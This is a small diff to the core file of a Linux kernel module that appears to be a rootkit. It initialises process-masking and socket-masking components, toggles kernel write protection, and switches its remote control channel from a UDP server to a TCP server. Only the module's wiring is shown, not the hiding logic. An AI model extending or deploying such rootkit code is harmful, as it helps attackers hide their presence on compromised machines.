@@ -32,7 +32,7 @@
 #include "process_masking.h"	/* Needed for ... */
 #include "socket_masking.h"		/* Needed for ... */
 #include "conf_manager.h"		/* Needed for ... */
-#include "udp_server.h"			/* Needed for ... */
+#include "tcp_server.h"			/* Needed for ... */
 
 
 MODULE_LICENSE("GPL");
@@ -121,7 +121,7 @@ static int __init core_start(void)
 	process_masking_init(DEBUG_MODE_IS_ON);
 	socket_masking_init(DEBUG_MODE_IS_ON);
 	conf_manager_init(DEBUG_MODE_IS_ON);
-	udp_server_init(DEBUG_MODE_IS_ON);
+	tcp_server_init(DEBUG_MODE_IS_ON);
 
 	DEBUG_PRINT("successfully inserted");
 
@@ -143,7 +143,7 @@ static void __exit core_end(void)
 
 	enable_write_protect_mode();
 
-	udp_server_exit();
+	tcp_server_exit();
 	conf_manager_exit();
 	socket_masking_exit();
 	process_masking_exit();
